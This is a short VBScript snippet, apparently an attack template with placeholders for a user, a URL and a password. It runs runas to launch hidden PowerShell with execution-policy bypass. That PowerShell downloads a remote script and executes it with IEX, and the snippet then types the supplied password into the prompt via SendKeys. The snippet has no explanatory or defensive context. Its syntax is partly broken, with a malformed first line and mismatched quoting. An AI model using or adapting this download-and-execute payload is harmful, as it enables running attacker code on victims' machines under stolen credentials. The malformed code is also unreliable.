Setshell * wscript.createobject("wscript.shell")
Shell.run "runas /user:$user " & """" & C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c \" & """" & "IEX ((New-Object Net.WebClient).downloadstring('$url'))\" & """" & """" wscript.sleep (100)
shell.Sendkeys "$password" & "{ENTER}"
